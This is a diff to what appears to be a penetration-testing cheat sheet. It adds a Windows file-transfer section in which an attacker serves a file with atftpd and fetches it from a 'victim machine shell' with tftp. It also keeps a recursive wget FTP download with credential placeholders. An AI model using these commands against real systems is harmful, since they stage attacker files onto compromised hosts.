@@ -98,7 +98,7 @@ Alice needs Bob's help. Since Alice is beyond firewall it is impossible to BOB t
 
 	1.3.6.1.2.1.6.13.1.3 TCP Local Ports
 	
-# File Transfer
+# File Transfer Linux
 
 <b>Netcat:</b>
 
@@ -121,6 +121,24 @@ Alice needs Bob's help. Since Alice is beyond firewall it is impossible to BOB t
 <b>Recursive wget ftp download:</b>
 
 	wget -r ftp://<[USER]>:<[PASSWORD]>@<[DOMAIN]>
+	
+# File Transfer Windows
+
+<b>TFTP</b> (Installed by default up to Windows XP and 2003, In Windows 7, 2008 and above needs to be explicitly added. For this reason tftp not ideal file transfer protocol in most situations.)
+
+	On attacker machine:
+	
+	mkdir tftp
+	
+	atftpd --deamon --port 69 tftp
+	
+	cp <[FILE]> tftp
+	
+	On victim machine shell:
+	
+	tftp -i <[IP]> GET <[FILE]>
+
+
 
 
 
